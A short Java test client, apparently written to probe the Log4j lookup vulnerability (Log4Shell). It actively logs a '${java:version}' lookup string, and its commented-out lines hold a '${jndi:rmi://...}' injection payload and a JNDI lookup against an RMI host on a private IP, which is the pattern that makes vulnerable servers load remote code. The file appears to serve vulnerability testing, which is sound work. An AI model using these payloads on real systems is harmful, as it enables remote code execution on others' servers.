package com.lqz;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Context;
import javax.naming.InitialContext;

/**
 * @author liaoqinzhou_sz
 * @version 1.0.0
 * @Description TODO
 * @createTime 2021年12月13日 09:19:00
 */
public class Client {
    private static Logger log = LogManager.getLogger(Client.class);

    public static void main(String[] args) throws Exception {
//        String url = "rmi://172.17.129.17:8888/test";
//        log.error("client2:${jndi:{}}",url);
        log.error("${java:version}");
//        Context ctx = new InitialContext();
//        ctx.lookup(url);
    }

}
